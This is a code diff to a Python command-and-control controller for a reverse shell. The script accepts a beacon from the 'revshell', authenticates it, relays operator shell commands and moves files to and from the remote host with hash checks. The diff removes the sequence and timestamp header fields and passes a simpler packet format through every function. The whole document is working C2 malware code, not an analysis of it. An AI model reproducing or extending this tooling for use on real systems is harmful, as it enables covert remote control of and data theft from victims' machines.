@@ -9,7 +9,7 @@ import hashlib
 
 
 # GLOBAL CONSTANTS
-HEADER_FORMAT = '!B H I I'  # B = MTYPE (1 byte); H = SEQ (2 bytes); I = PAYLOAD LENGTH (4 bytes); I = TIMESTAMP (4 bytes)
+HEADER_FORMAT = '!B I'  # B = MTYPE (1 byte); I = PAYLOAD LENGTH (4 bytes)
 HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 
 LHOST = '127.0.0.1'
 KEY = 'placeholder'
@@ -39,37 +39,37 @@ def vprint(*args):
         print(*args)
 
 def recv_packet(s):
-    header = b''                                                                      # RECEIVE HEADER
+    header = bytearray()                                                              # RECEIVE HEADER
     while len(header) < HEADER_SIZE:
         packet = s.recv(HEADER_SIZE - len(header))
         if not packet:
             raise ConnectionError('--- CONNECTION ERROR ---')
-        header += packet 
-    mtype, seq, payload_length, timestamp = struct.unpack(HEADER_FORMAT, header)      # UNPACK HEADER
+        header.extend(packet)
+    mtype, payload_length = struct.unpack(HEADER_FORMAT, header)                      # UNPACK HEADER
 
     if payload_length > 0:                                                            # RECEIVE PAYLOAD
-        payload = b''
+        payload = bytearray()                                       
         while len(payload) < payload_length:
             packet = s.recv(payload_length - len(payload))
             if not packet:
                 raise ConnectionError('--- CONNECTION ERROR ---')
-            payload += packet 
+            payload.extend(packet) 
     else:
         payload = b''
-    return mtype, seq, payload_length, timestamp, payload
+    
+    return mtype, payload_length, payload                                             # RETURN MTYPE, PAYLOAD_LENGTH, PAYLOAD
 
-def send_data(s, mtype: int, seq: int, payload: bytes) -> bool:
+def send_data(s, mtype: int, payload: bytes) -> bool:
     try: 
-        timestamp = int(time.time())
-        header = struct.pack(HEADER_FORMAT, mtype, seq, len(payload), timestamp)
+        header = struct.pack(HEADER_FORMAT, mtype, len(payload))
         s.sendall(header + payload)
-        #seq += 1
         return True
     except Exception as e:
         print(e)
         return False
 
-def init(args):	    # INIT FUNCTION
+# INIT FUNCTION
+def init(args):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -89,7 +89,7 @@ def init(args):	    # INIT FUNCTION
 
             if response[0] == MT_BEACON:                # CHECKS IF RECEIVED PACKET HAS BEACON PING
                 print('=== AUTHENTICATING ===')
-                send_data(conn, MT_AUTH, 0, b'')        # SENDS AUTH REQ PACKET TO REVSHELL
+                send_data(conn, MT_AUTH, b'')        # SENDS AUTH REQ PACKET TO REVSHELL
                 vprint('sent packet to revshell with MT_AUTH flag')
                 
                 response = recv_packet(conn)            # GRABS RESPONSE FROM REVSHELL
@@ -97,7 +97,7 @@ def init(args):	    # INIT FUNCTION
                 if response[0] == MT_AUTH:              # CHECKS IF REVSHELL SENDS AUTH OK 
                     vprint(f'auth acknowledged -> MTYPE MT_AUTH MATCH 1: {response[0]}')
                     print('+++ INIT COMPLETE +++')
-                    return conn, response[1]            # IF AUTH OK THEN RETURNS REVSHELL SOCKET AND BEACON_SEQ TO MAIN FUNCTION
+                    return conn                         # IF AUTH OK THEN RETURNS REVSHELL SOCKET
                 print('--- AUTH HANDSHAKE FAILED ---')
 
             else:                                       # IF ERROR THEN DROPS CONNECTION AND RETURNS ERROR
@@ -108,7 +108,7 @@ def init(args):	    # INIT FUNCTION
             print(f'Error: {e}')
             sys.exit(1)
 
-def upload_file(s, seq, local_filepath: str) -> bool:
+def upload_file(s, local_filepath: str) -> bool:
 
     if not os.path.exists(local_filepath):            # FILEPATH CHECK
         print('=== LOCAL FILE NOT FOUND ===')
@@ -121,7 +121,7 @@ def upload_file(s, seq, local_filepath: str) -> bool:
     file_hash = hashlib.sha256(file_bytes).hexdigest()                          # GENERATE FILE HASH
     metadata = f'{os.path.basename(local_filepath)}|{file_size}|{file_hash}'.encode('utf-8', errors='replace') # GENERATE AND ENCODE METADATA
 
-    send_data(s, MT_UP, seq, metadata)    # SEND FILE HASH METADATA
+    send_data(s, MT_UP, metadata)    # SEND FILE HASH METADATA
     vprint(f'FILE METADATA SENT: {metadata}')
     response = recv_packet(s)             # CATCH FILE_UP ACK PACKET
     vprint(f'FILE_UP ACK PACKET RECEIVED: {response}')
@@ -132,7 +132,7 @@ def upload_file(s, seq, local_filepath: str) -> bool:
         chunk_seq = 0                               
         for c in range(0, file_size, chunk_size):   # FOR LOOP TO SEND FILE BYTES IN CHUNKS UNTIL ENTIRE FILE IS SENT
             chunk = file_bytes[c:c+chunk_size]
-            if not send_data(s, MT_DATA, chunk_seq, chunk):
+            if not send_data(s, MT_DATA, chunk):
                 print('--- CONNECTION ERROR - FAILED TO SEND FILE DATA ---')
             chunk_seq += 1
         print('+++ FILE DATA SENT +++')
@@ -140,7 +140,7 @@ def upload_file(s, seq, local_filepath: str) -> bool:
 
     try:
         response = recv_packet(s)                       # CATCH RESPONSE PACKET 
-        if response[0] == MT_UP and response[4] == metadata:                     # IF HASH MATCH, RETURN TRUE; ELSE RETURN FALSE
+        if response[0] == MT_UP and response[2] == metadata:                     # IF HASH MATCH, RETURN TRUE; ELSE RETURN FALSE
             vprint(f'SUCCESS - UPLOAD ACK PACKET: {response}')
             print(f'+++ FILE {local_filepath} SUCCESSFULLY UPLOADED TO {s.getpeername()[0]}:{s.getpeername()[1]} +++')
             return True
@@ -152,15 +152,15 @@ def upload_file(s, seq, local_filepath: str) -> bool:
         print(f'--- CONNECTION ERROR: {e} ---')
         return False
 
-def download_file(s, seq, remote_filepath: str) -> bool:
+def download_file(s, remote_filepath: str) -> bool:
     
     try:
-        send_data(s, MT_DWN, seq, remote_filepath.encode('utf-8', errors='replace'))
+        send_data(s, MT_DWN, remote_filepath.encode('utf-8', errors='replace'))
         packet = recv_packet(s)
 
         if packet:
 
-            metadata = packet[4].decode('utf-8', errors='replace')  # DECODE PACKET METADATA PAYLOAD
+            metadata = packet[2].decode('utf-8', errors='replace')  # DECODE PACKET METADATA PAYLOAD
             unpack_metadata = metadata.split('|', 2)                # READY METADATA FOR UNPACKING
             
             if len(unpack_metadata) != 3:                           # RETURN FALSE IF PACKET METADATA NOT AS EXPECTED
@@ -177,8 +177,8 @@ def download_file(s, seq, remote_filepath: str) -> bool:
             while file_bytes_recv < file_size:                      # WHILE LOOP TO KEEP RECEIVING BYTES UNTIL RECEIVED BYTES == EXPECTED FILE SIZE
                 response = recv_packet(s)
                 if response[0] == MT_DATA:
-                    file_bytes.extend(response[4])
-                    file_bytes_recv += len(response[4])
+                    file_bytes.extend(response[2])
+                    file_bytes_recv += len(response[2])
                 
                 else:
                     print(f'unexpected mtype during upload: {response[0]}')
@@ -188,13 +188,13 @@ def download_file(s, seq, remote_filepath: str) -> bool:
             local_metadata = f'{file_name}|{file_bytes_recv}|{mem_file_hash}'.encode('utf-8', errors='replace')     # PACKAGES RECEIVED FILE LOCAL METADATA
 
             if mem_file_hash == file_hash and file_bytes_recv == file_size:     # IF LOCAL AND REMOTE HASH AND FILE SIZE MATCH THEN WRITE TO DISK AND SEND ACK PACKET TO C2 AND RETURN TRUE
-                print('+++ INEGRITY ACK - TRUE +++')
+                print('+++ INTEGRITY ACK - TRUE +++')
                 
                 with open(file_name, 'wb') as file:
                     file.write(file_bytes)
                 print(f'+++ {file_name} WRITTEN TO DISK +++')
 
-                send_data(s, MT_DWN, seq, local_metadata)
+                send_data(s, MT_DWN, local_metadata)
                 return True
 
             else:
@@ -205,7 +205,7 @@ def download_file(s, seq, remote_filepath: str) -> bool:
 
         else:
             print('--- NO METADATA RECEIVED ---')
-            vprint(f'--- SENT DATA ({s}, {MT_DWN}, {seq}, {remote_filepath} - RECEIVED NO RESPONSE! ---)')
+            vprint(f'--- SENT DATA ({s}, {MT_DWN}, {remote_filepath} - RECEIVED NO RESPONSE! ---)')
             return False
 
         return True
@@ -223,7 +223,7 @@ def main():
     while True:
         s = None
         try:
-            s, seq = init(c2_args)
+            s = init(c2_args)
 
             while True:
                 try:
@@ -239,7 +239,7 @@ def main():
                             print('--- ERROR: TOO MANY ARGS! ---\n === USAGE: UPLOAD <LOCAL_FILEPATH> ===')
                             continue
                         local_filepath = cmd_args[1].strip()
-                        upload_file(s, seq, local_filepath)
+                        upload_file(s, local_filepath)
                         continue
 
                     if cmd.lower().startswith('download'):
@@ -248,14 +248,14 @@ def main():
                             print('--- ERROR: TOO MANY ARGS! ---\n === USAGE: DOWNLOAD <REMOTE_FILEPATH> ===')
                             continue
                         remote_filepath = cmd_args[1].strip()
-                        download_file(s, seq, remote_filepath)
+                        download_file(s, remote_filepath)
                         continue
 
                     if cmd:    
-                        send_data(s, MT_CMD, seq, cmd.encode('utf-8', errors='replace'))
+                        send_data(s, MT_CMD, cmd.encode('utf-8', errors='replace'))
                         response = recv_packet(s)
                         if response[0] == MT_RECV:
-                            print(response[4].decode(), end='')
+                            print(response[2].decode(), end='')
                         else:
                             print(f'ERROR: UNKNOWN MSG TYPE')
                             vprint(f'packet: {response}')
